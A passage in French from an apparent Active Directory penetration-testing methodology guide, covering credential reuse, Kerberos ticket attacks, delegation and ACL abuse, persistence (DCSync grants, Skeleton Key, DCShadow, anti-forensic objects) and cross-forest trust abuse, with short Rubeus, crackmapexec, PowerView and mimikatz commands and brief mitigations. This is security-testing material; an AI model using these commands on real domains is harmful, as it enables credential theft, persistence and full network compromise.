Une fois que vous avez obtenu des identifiants, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** afin de tenter de vous connecter à plusieurs serveurs avec différents protocoles, selon les résultats de vos scans de ports.

### Élévation de privilèges locale

Si vous avez compromis des identifiants ou une session en tant qu’utilisateur de domaine ordinaire et que vous pouvez accéder à **n’importe quelle machine du domaine**, cherchez un moyen **d’élever vos privilèges localement et de collecter des identifiants**. Des privilèges d’administrateur local peuvent vous permettre de **récupérer les hashes d’autres utilisateurs** depuis la mémoire (LSASS) et le stockage local (SAM).

Ce livre contient une page complète sur l’[**élévation de privilèges locale sous Windows**](../windows-local-privilege-escalation/index.html) ainsi qu’une [**checklist**](../checklist-windows-privilege-escalation.md). Pensez également à utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la session actuelle

Il est très **peu probable** que vous trouviez des **tickets** dans la session de l’utilisateur actuel **vous donnant accès** à des ressources inattendues, mais vous pouvez vérifier :

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Avec des identifiants de domaine ou une session utilisateur, revenez sur les [**attaques relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM : les techniques d’énumération authentifiée et de coercition peuvent révéler des chemins de relay qui n’étaient pas accessibles lors de la reconnaissance sans authentification.

### Recherche d’identifiants dans les partages d’ordinateurs | Partages SMB

Maintenant que vous disposez de quelques identifiants de base, vérifiez si vous pouvez **trouver** des **fichiers intéressants partagés au sein de l’AD**. Vous pourriez le faire manuellement, mais c’est une tâche très fastidieuse et répétitive (d’autant plus si vous trouvez des centaines de documents à vérifier).

[**Suivez ce lien pour découvrir les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Voler des identifiants NTLM

Si vous pouvez **accéder à d’autres PC ou partages**, vous pourriez **y déposer des fichiers** (comme un fichier SCF) qui, s’ils sont consultés, **déclencheront une authentification NTLM auprès de vous**. Vous pourrez ainsi **voler** le **challenge NTLM** afin de le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Élévation de privilèges dans Active Directory AVEC des identifiants/une session privilégiés

**Pour les techniques suivantes, un utilisateur de domaine standard ne suffit pas : vous avez besoin de privilèges ou d’identifiants spécifiques pour mener ces attaques.**

### Extraction de hash

Avec un peu de chance, vous avez réussi à **compromettre un compte d’administrateur local** à l’aide d’[AsRepRoast](asreproast.md), du [Password Spraying](password-spraying.md), de [Kerberoast](kerberoast.md), de [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), y compris par relay, d’[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), ou en [élevant vos privilèges localement](../windows-local-privilege-escalation/index.html).\
Il est ensuite temps de dumper tous les hash présents en mémoire et localement.\
[**Consultez cette page pour découvrir différentes façons d’obtenir les hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d’un utilisateur**, vous pouvez l’utiliser pour **usurper son identité**.\
Vous devez utiliser un **outil** qui **effectuera** l’**authentification NTLM à l’aide de** ce **hash**, **ou** créer une nouvelle **sessionlogon** et **injecter** ce **hash** dans **LSASS**. Ainsi, lorsque **l’authentification NTLM sera effectuée**, ce **hash sera utilisé**. C’est ce que fait mimikatz.\
[**Consultez cette page pour plus d’informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l’utilisateur pour demander des tickets Kerberos**, comme alternative à la technique Pass The Hash classique utilisant le protocole NTLM. Elle peut donc être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où **seul Kerberos est autorisé** comme protocole d’authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d’attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d’authentification d’un utilisateur** plutôt que son mot de passe ou ses hash. Ce ticket volé est ensuite utilisé pour **usurper l’identité de l’utilisateur** et obtenir un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Réutilisation d’identifiants

Si vous avez le **hash** ou le **mot de passe** d’un **administrateur local**, essayez de vous **connecter localement** à d’autres **PC** avec ces informations.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Notez que cela génère beaucoup de **bruit** et que **LAPS** permettrait d’y **remédier**.

### Abus de MSSQL et liens de confiance

Si un utilisateur dispose de privilèges pour **accéder aux instances MSSQL**, il pourrait **exécuter des commandes** sur l’hôte MSSQL (si le service s’exécute en tant que SA), **voler** le **hash** NetNTLM ou même lancer une **relay attack**.\
Si une instance MSSQL est approuvée par une autre instance via un lien de base de données, un utilisateur disposant de privilèges sur la base de données liée pourrait **utiliser cette relation de confiance pour exécuter des requêtes sur l’autre instance**. Ces relations de confiance peuvent être chaînées et mener à une base de données mal configurée sur laquelle l’utilisateur peut exécuter des commandes.\
**Les liens entre bases de données fonctionnent également à travers les relations d’approbation entre forêts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abus des plateformes de gestion des actifs et de déploiement informatique

Les suites tierces d’inventaire et de déploiement exposent souvent des moyens puissants d’accéder aux identifiants et d’exécuter du code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Délégation non contrainte

Si vous trouvez un objet Computer avec l’attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et disposez de privilèges de domaine sur cet ordinateur, vous pourrez extraire de la mémoire les TGT de tous les utilisateurs qui s’y connectent.\
Ainsi, si un **Domain Admin se connecte à l’ordinateur**, vous pourrez extraire son TGT et usurper son identité avec [Pass the Ticket](pass-the-ticket.md).\
Grâce à la délégation contrainte, vous pourriez même **compromettre automatiquement un Print Server** (espérons qu’il s’agisse d’un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Délégation contrainte

Si un utilisateur ou un ordinateur est autorisé à utiliser la « délégation contrainte », il pourra **usurper l’identité de n’importe quel utilisateur pour accéder à certains services sur un ordinateur**.\
Ainsi, si vous **compromettez le hash** de cet utilisateur ou ordinateur, vous pourrez **usurper l’identité de n’importe quel utilisateur** (même des domain admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Délégation contrainte basée sur les ressources

Disposer du privilège **WRITE** sur un objet Active Directory d’un ordinateur distant permet d’obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abus des permissions/ACL

L’utilisateur compromis pourrait disposer de **privilèges intéressants sur certains objets du domaine**, qui pourraient vous permettre de **vous déplacer** latéralement et d’**escalader** vos privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abus du service Printer Spooler

La découverte d’un **service Spool à l’écoute** dans le domaine peut être **exploitée** pour **obtenir de nouveaux identifiants** et **escalader ses privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abus des sessions de tiers

Si **d’autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des identifiants en mémoire** et même d’**injecter des beacons dans leurs processus** pour usurper leur identité.\
Les utilisateurs accèdent généralement au système via RDP ; voici donc comment mener quelques attaques sur des sessions RDP de tiers :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système de gestion du **mot de passe Administrateur local** sur les ordinateurs joints au domaine, afin qu’il soit **aléatoire**, unique et fréquemment **renouvelé**. Ces mots de passe sont stockés dans Active Directory et leur accès est contrôlé par des ACL, réservant celui-ci aux utilisateurs autorisés. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d’autres ordinateurs.


{{#ref}}
laps.md
{{#endref}}

### Vol de certificats

**Récupérer des certificats** sur la machine compromise peut permettre d’escalader ses privilèges dans l’environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abus des modèles de certificats

Si des **modèles vulnérables** sont configurés, il est possible de les exploiter pour escalader ses privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation avec un compte à privilèges élevés

### Extraction des identifiants du domaine

Une fois que vous avez obtenu les privilèges de **Domain Admin**, ou mieux encore d’**Enterprise Admin**, vous pouvez **extraire** la **base de données du domaine** : _ntds.dit_.

[**Vous trouverez ici plus d’informations sur l’attaque DCSync**](dcsync.md).

[**Vous trouverez ici plus d’informations sur le vol de NTDS.dit**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Une archive de sauvegarde lisible contenant `ntds.dit` et la ruche `SYSTEM` doit être considérée comme exposant des données d’annuaire, même avant son extraction. Un hash de mot de passe obsolète ne rend pas sûrs les autres attributs des objets : des champs comme `description` peuvent contenir des identifiants ou des notes opérationnelles. Examinez d’abord les noms des membres de l’archive et évitez d’inclure le contenu de la base de données extraite dans les sorties d’énumération habituelles.

### Privesc comme mécanisme de persistance

Certaines des techniques abordées précédemment peuvent servir à assurer la persistance.\
Par exemple, vous pourriez :

- Rendre des utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Rendre les utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Accorder des privilèges [**DCSync**](#dcsync) à un utilisateur

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

L’**attaque Silver Ticket** crée un **ticket Ticket Granting Service (TGS) légitime** pour un service spécifique en utilisant le **hash NTLM** (par exemple, le **hash du compte de l’ordinateur**). Cette méthode sert à **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **attaque Golden Ticket** consiste pour un attaquant à obtenir le **hash NTLM du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est particulier, car il sert à signer tous les **Ticket Granting Tickets (TGT)**, indispensables pour s’authentifier sur le réseau AD.

Une fois ce hash obtenu, l’attaquant peut créer des **TGT** pour n’importe quel compte de son choix (attaque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Il s’agit de tickets similaires aux golden tickets, mais forgés de manière à **contourner les mécanismes courants de détection des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistance avec les certificats d’un compte**

**Posséder les certificats d’un compte ou pouvoir les demander** est un très bon moyen de maintenir sa persistance dans le compte d’un utilisateur (même s’il change de mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistance avec les certificats du domaine**

**Il est également possible d’utiliser des certificats pour maintenir une persistance avec des privilèges élevés dans le domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Groupe AdminSDHolder

L’objet **AdminSDHolder** dans Active Directory protège les **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **liste de contrôle d’accès (ACL)** standard à ces groupes pour empêcher les modifications non autorisées. Toutefois, cette fonctionnalité peut être exploitée : si un attaquant modifie l’ACL d’AdminSDHolder pour accorder un accès complet à un utilisateur ordinaire, celui-ci obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, conçue pour protéger, peut donc se retourner contre vous et permettre un accès indu si elle n’est pas surveillée de près.

[**Plus d’informations sur le groupe AdminDSHolder ici.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Identifiants DSRM

Sur chaque **contrôleur de domaine (DC)**, il existe un compte **administrateur local**. En obtenant des droits d’administrateur sur une telle machine, il est possible d’extraire le hash de l’administrateur local avec **mimikatz**. Il faut ensuite modifier le registre pour **activer l’utilisation de ce mot de passe**, ce qui permet d’accéder à distance au compte Administrateur local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistance par ACL

Vous pouvez **accorder** des **permissions spéciales** à un **utilisateur** sur certains objets du domaine, ce qui lui permettra **d’élever ses privilèges ultérieurement**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descripteurs de sécurité

Les **descripteurs de sécurité** servent à **stocker** les **permissions** qu’un **objet** détient **sur** un autre **objet**. Si vous pouvez simplement **apporter une légère modification** au **descripteur de sécurité** d’un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d’appartenir à un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objets dynamiques : anti-forensics / évasion

Exploitez la classe auxiliaire `dynamicObject` pour créer des principaux/GPO/enregistrements DNS à durée de vie limitée avec `entryTTL`/`msDS-Entry-Time-To-Die` ; ils s’autosuppriment sans tombstones, effaçant les preuves LDAP tout en laissant des SID orphelins, des références `gPLink` brisées ou des réponses DNS mises en cache (par exemple, pollution des ACE d’AdminSDHolder ou redirections malveillantes de `gPCFileSysPath`/du DNS intégré à AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifiez **LSASS** en mémoire pour établir un **mot de passe universel**, donnant accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personnalisé

[Découvrez ici ce qu’est un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **texte clair** les **identifiants** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Cette technique enregistre un **nouveau contrôleur de domaine** dans l’AD et l’utilise pour **pousser des attributs** (SIDHistory, SPN...) sur des objets spécifiés, **sans** laisser de **journaux** concernant les **modifications**. Vous **devez disposer des privilèges DA** et vous trouver dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des journaux plutôt inquiétants apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistance LAPS

Nous avons précédemment vu comment élever ses privilèges si vous avez **suffisamment de permissions pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent également servir à **maintenir la persistance**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Élévation de privilèges dans la forêt - relations d’approbation entre domaines

Microsoft considère la **forêt** comme la frontière de sécurité. Cela signifie que **la compromission d’un seul domaine peut potentiellement entraîner celle de toute la forêt**.<sup>[[1]](#references)</sup>

### Informations de base

Une [**relation d’approbation entre domaines**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d’un **domaine** d’accéder aux ressources d’un autre **domaine**. Elle établit essentiellement un lien entre les systèmes d’authentification des deux domaines, permettant aux vérifications d’authentification de s’effectuer de manière transparente. Lorsque des domaines établissent une relation d’approbation, ils échangent et conservent des **clés** spécifiques dans leurs **contrôleurs de domaine (DC)**, qui sont indispensables à l’intégrité de cette relation.

Dans un scénario typique, si un utilisateur souhaite accéder à un service dans un **domaine approuvé**, il doit d’abord demander à son propre DC un ticket spécial appelé **TGT inter-domaines**. Ce TGT est chiffré avec une **clé** partagée convenue par les deux domaines. L’utilisateur présente ensuite ce TGT au **DC du domaine approuvé** pour obtenir un ticket de service (**TGS**). Après avoir validé le TGT inter-domaines, le DC du domaine approuvé émet un TGS qui accorde à l’utilisateur l’accès au service.

**Étapes** :

1. Un **ordinateur client** du **Domaine 1** lance le processus en utilisant son **hash NTLM** pour demander un **Ticket Granting Ticket (TGT)** à son **contrôleur de domaine (DC1)**.
2. DC1 émet un nouveau TGT si l’authentification du client réussit.
3. Le client demande ensuite à DC1 un **TGT inter-domaines**, nécessaire pour accéder aux ressources du **Domaine 2**.
4. Le TGT inter-domaines est chiffré avec une **clé d’approbation** partagée entre DC1 et DC2 dans le cadre de la relation d’approbation bidirectionnelle entre les deux domaines.
5. Le client transmet le TGT inter-domaines au **contrôleur de domaine du Domaine 2 (DC2)**.
6. DC2 vérifie le TGT inter-domaines à l’aide de sa clé d’approbation partagée et, s’il est valide, émet un **Ticket Granting Service (TGS)** pour le serveur du Domaine 2 auquel le client souhaite accéder.
7. Enfin, le client présente ce TGS au serveur. Celui-ci est chiffré avec le hash du compte du serveur et permet d’accéder au service du Domaine 2.

### Différents types de relations d’approbation

Il est important de noter qu’**une relation d’approbation peut être unidirectionnelle ou bidirectionnelle**. Dans une relation bidirectionnelle, les deux domaines se font mutuellement confiance ; dans une relation **unidirectionnelle**, l’un des domaines est le domaine **approuvé** et l’autre, le domaine **qui fait confiance**. Dans ce dernier cas, **vous ne pourrez accéder aux ressources du domaine qui fait confiance que depuis le domaine approuvé**.

Si le Domaine A fait confiance au Domaine B, A est le domaine qui fait confiance et B est le domaine approuvé. De plus, dans le **Domaine A**, il s’agit d’une relation d’approbation **sortante** ; dans le **Domaine B**, il s’agit d’une relation d’approbation **entrante**.

**Différents types de relations d’approbation**

- **Relations parent-enfant** : Configuration courante au sein d’une même forêt, dans laquelle un domaine enfant dispose automatiquement d’une relation d’approbation transitive bidirectionnelle avec son domaine parent. Cela signifie essentiellement que les demandes d’authentification peuvent circuler de manière transparente entre le parent et l’enfant.
- **Relations de liaison croisée** : Également appelées « relations d’approbation raccourcies », elles sont établies entre des domaines enfants afin d’accélérer les processus de référence. Dans les forêts complexes, les références d’authentification doivent généralement remonter jusqu’à la racine de la forêt, puis redescendre jusqu’au domaine cible. Les liaisons croisées raccourcissent ce parcours, ce qui est particulièrement utile dans les environnements géographiquement dispersés.
- **Relations d’approbation externes** : Elles sont établies entre des domaines différents et non apparentés et ne sont pas transitives par nature. Selon la [documentation de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les relations d’approbation externes sont utiles pour accéder aux ressources d’un domaine situé en dehors de la forêt actuelle et qui n’est pas relié par une relation d’approbation de forêt. Le filtrage SID renforce la sécurité de ces relations.
- **Relations d’approbation entre racines d’arborescence** : Elles sont automatiquement établies entre le domaine racine de la forêt et une nouvelle racine d’arborescence. Bien qu’elles soient rarement rencontrées, elles sont importantes pour ajouter de nouvelles arborescences de domaines à une forêt, leur permettant de conserver un nom de domaine unique tout en garantissant une transitivité bidirectionnelle. Vous trouverez plus d’informations dans le [guide de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Relations d’approbation de forêt** : Ce type de relation est bidirectionnel et transitif entre deux domaines racines de forêt ; il applique également le filtrage SID afin de renforcer les mesures de sécurité.
- **Relations d’approbation MIT** : Elles sont établies avec des domaines Kerberos non-Windows [conformes à la RFC4120](https://tools.ietf.org/html/rfc4120). Ces relations sont plus spécialisées et adaptées aux environnements nécessitant une intégration avec des systèmes basés sur Kerberos en dehors de l’écosystème Windows.

#### Autres différences entre les **relations d’approbation**

- Une relation d’approbation peut également être **transitive** (A fait confiance à B, B fait confiance à C, donc A fait confiance à C) ou **non transitive**.
- Une relation d’approbation peut être **bidirectionnelle** (les deux domaines se font confiance) ou **unidirectionnelle** (un seul fait confiance à l’autre).

### Chemin d’attaque

1. **Énumérer** les relations d’approbation
2. Vérifier si un **principal de sécurité** (utilisateur/groupe/ordinateur) a **accès** aux ressources de l’**autre domaine**, par exemple via des entrées ACE ou parce qu’il appartient à des groupes de l’autre domaine. Rechercher les **relations entre domaines** (c’est probablement la raison pour laquelle la relation d’approbation a été créée).
   1. Dans ce cas, kerberoast pourrait être une autre option.
3. **Compromettre** les **comptes** qui peuvent **pivoter** entre les domaines.

Les attaquants qui peuvent accéder aux ressources d’un autre domaine peuvent le faire par trois mécanismes principaux :

- **Appartenance à un groupe local** : Des principaux peuvent être ajoutés à des groupes locaux sur des machines, comme le groupe « Administrateurs » d’un serveur, ce qui leur donne un contrôle important sur cette machine.
- **Appartenance à un groupe d’un domaine externe** : Des principaux peuvent également appartenir à des groupes du domaine externe. Toutefois, l’efficacité de cette méthode dépend de la nature de la relation d’approbation et de la portée du groupe.
- **Listes de contrôle d’accès (ACL)** : Des principaux peuvent être spécifiés dans une **ACL**, notamment en tant qu’entités dans des **ACE** au sein d’une **DACL**, ce qui leur donne accès à des ressources spécifiques. Pour approfondir le fonctionnement des ACL, DACL et ACE, le livre blanc intitulé « [An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf) » est une ressource précieuse.<sup>[[17]](#references)</sup>

### Trouver des utilisateurs/groupes externes disposant de permissions

Vous pouvez consulter **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les principaux de sécurité étrangers du domaine. Il s’agira d’utilisateurs/groupes provenant d’**un domaine ou d’une forêt externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou avec powerview :

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Élévation de privilèges Child-to-Parent forest

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Autres façons d’énumérer les relations d’approbation de domaine :

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Il existe **2 clés d’approbation**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez récupérer celle utilisée par le domaine actuel avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Élevez vos privilèges au rang d’Enterprise admin du domaine enfant/parent en abusant de la relation d’approbation avec SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploiter le Configuration NC modifiable

Il est crucial de comprendre comment le Configuration Naming Context (NC) peut être exploité. Dans les environnements Active Directory (AD), le Configuration NC sert de référentiel central pour les données de configuration de l’ensemble de la forêt. Ces données sont répliquées sur chaque Domain Controller (DC) de la forêt, les DC modifiables conservant une copie modifiable du Configuration NC. Pour exploiter cela, il faut disposer de **privilèges SYSTEM sur un DC**, de préférence un DC enfant.

**Lier un GPO au site du DC racine**

Le conteneur Sites du Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forêt AD. Avec des privilèges SYSTEM sur n’importe quel DC, les attaquants peuvent lier des GPO aux sites du DC racine. Cette action peut compromettre le domaine racine en manipulant les stratégies appliquées à ces sites.

Pour approfondir le sujet, consultez les recherches sur [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromettre n’importe quel gMSA de la forêt**

Une piste d’attaque consiste à cibler les gMSA privilégiés du domaine. La clé KDS Root, essentielle au calcul des mots de passe des gMSA, est stockée dans le Configuration NC. Avec des privilèges SYSTEM sur n’importe quel DC, il est possible d’accéder à la clé KDS Root et de calculer les mots de passe de n’importe quel gMSA de la forêt.

Une analyse détaillée et des instructions étape par étape sont disponibles ici :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque complémentaire contre les MSA délégués (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe complémentaire : [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Attaque par modification du schéma**

Cette méthode demande de la patience : il faut attendre la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier le schéma AD afin d’accorder à n’importe quel utilisateur le contrôle total de toutes les classes. Cela peut entraîner un accès non autorisé aux nouveaux objets AD et leur prise de contrôle.

Pour en savoir plus, consultez [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA à EA avec ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets Public Key Infrastructure (PKI) afin de créer un modèle de certificat permettant de s’authentifier en tant que n’importe quel utilisateur de la forêt. Les objets PKI résidant dans le Configuration NC, la compromission d’un DC enfant modifiable permet de mener des attaques ESC5.

Pour plus de détails, consultez [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En l’absence d’ADCS, l’attaquant peut installer les composants nécessaires, comme indiqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domaine de forêt externe - unidirectionnelle (entrante) ou bidirectionnelle

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Dans ce scénario, **votre domaine est approuvé** par un domaine externe, qui vous accorde des **autorisations indéterminées**. Vous devrez trouver **quels principals de votre domaine disposent de quels accès au domaine externe**, puis tenter de les exploiter :


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine d’une forêt externe - sens sortant (unidirectionnel)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Dans ce scénario, **votre domaine** accorde sa **confiance** à des **principaux** de **domaines différents**.

Cependant, lorsqu’un domaine est **approuvé** par le domaine qui accorde sa confiance, le domaine approuvé **crée un utilisateur** dont le **nom est prévisible** et qui utilise **le mot de passe de confiance** comme mot de passe. Il est donc possible d’**accéder à un utilisateur du domaine qui accorde sa confiance pour entrer dans le domaine approuvé**, l’énumérer et tenter d’obtenir davantage de privilèges :

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine approuvé consiste à trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans le **sens opposé** à la relation d’approbation du domaine (ce qui est assez rare).

Une autre façon de compromettre le domaine approuvé consiste à attendre sur une machine à laquelle un **utilisateur du domaine approuvé peut accéder** pour se connecter via **RDP**. L’attaquant pourrait alors injecter du code dans le processus de session RDP et **accéder au domaine d’origine de la victime** depuis cette session.\
De plus, si la **victime a monté son disque dur**, l’attaquant pourrait, depuis le processus de session **RDP**, déposer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s’appelle **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mesures d’atténuation contre l’abus des relations d’approbation de domaine

### **SID Filtering :**

- Le risque d’attaques exploitant l’attribut SID history à travers les relations d’approbation entre forêts est atténué par le SID Filtering, activé par défaut sur toutes ces relations. Cette mesure repose sur l’hypothèse que les relations d’approbation au sein d’une forêt sont sécurisées, la forêt — et non le domaine — étant considérée comme la frontière de sécurité, conformément à la position de Microsoft.
- Toutefois, il y a un inconvénient : le SID filtering peut perturber les applications et l’accès des utilisateurs, ce qui conduit parfois à sa désactivation.

### **Selective Authentication :**

- Pour les relations d’approbation entre forêts, l’utilisation de Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. Des autorisations explicites sont plutôt nécessaires pour que les utilisateurs accèdent aux domaines et aux serveurs du domaine ou de la forêt qui accorde sa confiance.
- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du contexte de nommage Configuration (NC) inscriptible ni contre les attaques visant le compte de confiance.

[**Plus d’informations sur les relations d’approbation de domaine sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abus d’AD via LDAP depuis des implants sur l’hôte

